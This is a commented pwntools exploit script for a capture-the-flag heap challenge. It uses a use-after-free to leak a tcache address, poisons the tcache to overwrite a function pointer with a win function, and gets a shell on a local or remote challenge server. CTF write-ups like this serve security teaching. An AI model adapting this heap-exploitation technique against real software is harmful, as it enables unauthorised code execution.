#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# For this challenge, through playing around with the program I realised that if I 
# view the contents of a clone after it has been freed, you can get unexpected results.
# Hence, if I create and free two clones, and then view the contents of the second,
# the last four bytes of output will be a memory leak.

# If we open the binary in gdb and use the command 'vis_heap'chunks', I noticed this
# leaked address was actually the address of the first tcachebin. Also, looking at
# this chunk we can see exactly 0x8 + 0x4 = 0xc bytes after our leaked address is the
# address for the hint function used by the program.

# So, we can do a use after free on clone 0 to change the value stored in this 
# chunk to be the hint address. Then, we make two clones which can store any value, 
# and then a third clone whose value is the address of the win function. 

# Doing so will mean that if we access the hint function for clone 3, we will instead
# jump to the win function, which pops a shell as required.

# The script:
PROGNAME = "challenges/./usemedontabuseme"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7000

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf
 
def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ",timeout=0.1)
    result = p.recvline()
    menu()
    return result

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    return p.recvline()

# To get our heap address leak, we create and free two clones before viewing the 
# contents of the second one. The address is then the first 4 bytes of output.
make(0, b"AAAA")
make(1, b"BBBB")
kill(0)
kill(1)
addr = view(1)[:4]

# Now we have the leak for tcachebins, we add 0xc to get the stored address of the
# hint function. We then set the value of the already freed first clone to be this.
edit(0, p32(u32(addr) + 0xc))

# Next, we create two clones with any value, and a third clone whose value is the
# address of the win function, which will overwrite the hint function.
make(2, b"")
make(3, b"")
make(4, p32(elf.symbols["win"]))

# Finally, if we call the hint function on this clone, it will instead jump to the win
# function.
hint(3)

# Now we have a shell and can access the flag.
p.interactive()